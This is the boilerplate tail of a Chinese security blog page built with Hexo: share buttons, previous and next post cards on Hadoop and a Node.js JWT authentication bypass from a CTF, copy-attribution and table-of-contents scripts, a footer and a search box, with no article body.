                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
            <div class="card">
                <a href="/2020/06/06/big-data-hadoop/">
                    <div class="card-image">
                        
                        <img src="/medias/featureimages/big-data-1.jpg" class="responsive-img" alt="Big Data Hadoop">
                        
                        <span class="card-title">Big Data Hadoop</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            Hadoop是一个由Apache基金会所开发的分布式系统基础架构。用户可以在不了解分布式底层细节的情况下，开发分布式程序。充分利用集群的威力进行高速运算和存储。
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2020-06-06
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/" class="post-category">
                                    安全建设
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/">
                        <span class="chip bg-color">大数据</span>
                    </a>
                    
                    <a href="/tags/Hadoop/">
                        <span class="chip bg-color">Hadoop</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                Next&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2020/04/19/bypass-nodejs-jwt/">
                    <div class="card-image">
                        
                        <img src="/medias/featureimages/nodejs-1.jpg" class="responsive-img" alt="探索Node.js中JWT认证缺陷的绕过">
                        
                        <span class="card-title">探索Node.js中JWT认证缺陷的绕过</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            最近打比赛遇见一道Web题很有意思，考察的是Node.js中JWT认证问题，由于和自己以前所遇到的JWT认证绕过都不太一样，所以打算记录分析一下这个探索过程。
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-19
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
                                    Web安全
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/JWT/">
                        <span class="chip bg-color">JWT</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + 'From: Qftm<br />'
            + 'Author: Qftm<br />'
            + 'Link: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


<!-- 代码块折行 -->

<style type="text/css">
code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
</style>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h1, h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            <span id="year">2018</span>
            <a href="/about" target="_blank">Qftm</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">370.8k</span>&nbsp;字
            
            
            
            
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link ">
    <a href="https://github.com/Qftm" 
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:Qftmbin@gmail.com" 
        <i class="fas fa-envelope-open"></i>
    </a>





    <a href="https://twitter.com/Qftmer" 
        <i class="fab fa-twitter"></i>
    </a>









</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("/search.xml", 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    

    

    

    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
